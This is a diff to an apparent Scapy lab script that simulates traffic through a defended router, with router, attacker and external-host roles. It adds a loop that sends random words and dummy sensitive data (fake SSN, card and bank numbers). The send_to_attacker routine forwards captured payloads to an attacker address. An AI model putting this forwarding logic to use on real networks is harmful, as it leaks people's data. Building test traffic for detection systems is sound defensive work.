@@ -5,11 +5,13 @@
 
 from scapy.all import *
 from copy import deepcopy
+from random import randint
 import os
 import my_ips
 import router
+from time import sleep
 
-role = 'router'
+role = 'external_host'
 
 # Global 
 def_model = router.DefenseModel()
@@ -25,7 +27,7 @@ def_model = router.DefenseModel()
 #Modular packet sniffing function
 def packet_sniffer(my_filter, my_prn):
     print('Calling packet sniffer function.')
-    pkt = sniff(filter=my_filter, iface='eth1', prn=reroute_packet)
+    pkt = sniff(filter=my_filter, iface='eth1', prn=my_prn)
 
 #Send packets to a destination via the router VM. The router VM
 #simulates a router on the network that is equipped with the
@@ -39,7 +41,7 @@ def send_to_router(packet):
 
     load_append = ('|ORIG_DST=' + true_dst).encode("utf-8")
 
-    new_packet = IP(dst=router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
+    new_packet = IP(dst=my_ips.router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
 
     print('Sending packet to router:', new_packet.show())
     r1 = sr1(new_packet, timeout=5,iface='eth1')
@@ -53,7 +55,7 @@ def send_to_attacker(packet):
         data = packet[Raw].load
     except:
         data = ''.encode("utf-8")
-    new_packet = IP(dst=attacker_ip)/TCP(dport=80)/Raw(load=data)
+    new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
 
     send_to_router(new_packet)
 #---
@@ -151,6 +153,39 @@ def log_packet(packet):
 
 #---
 
+# Simulate external host that sends randomized packets
+def build_packet(external_host_ip):
+    RANDOMIZED_WORDS = ['This', 'packet', 'sentence', 'password', 'username', 
+            'advertisement', 'confidential', 'urgent', 'email', 'facebook', 'twitter',
+            'linkedin', 'important', 'details', 'about', 'this', 'warranty', 
+            'family', 'colleague', 'low', 'priority', 'social', 'security', 'number',
+            'is', '555-55-5555', 'credit', 'card', 'number', 'is', '4444-4444-4444-4444', 
+            'bank', 'account', 'number', 'is', '1234567', 'routing', 'number', 'is', 
+            '2222222']
+
+    # Generate a payload with a string of 10 randomized characters
+    MAX = 10
+    payload_string = ''
+    # Loop through 10 times to randomly select the 10 words
+    for i in range(0, MAX):
+        payload_string += RANDOMIZED_WORDS[randint(0, len(RANDOMIZED_WORDS) - 1)]
+        if i != MAX - 1:
+            payload_string += ' '
+    
+    # Append the original victim destination at end of payload
+    payload_string += ' |ORIG_DST=' + my_ips.victim_ip
+    payload_string = payload_string.encode('utf8')
+
+    packet = IP(dst=my_ips.router_ip)/TCP(dport=80)/Raw(load=payload_string)
+
+    send_packet(packet)
+
+def send_packet(packet):
+    print('Sending external packet')
+    r1 = sr1(packet, timeout=10, iface='eth1')
+    
+
+
 
 if __name__=='__main__':
     local_ip = get_if_addr('eth1')
@@ -160,4 +195,7 @@ if __name__=='__main__':
         packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
     elif(role == 'attacker'):
         packet_sniffer('src host ' + victim_ip + ' and tcp', log_packet)
-    
+    elif role == 'external_host':
+        while True:
+            build_packet(get_if_addr('eth1'))
+            sleep(5)
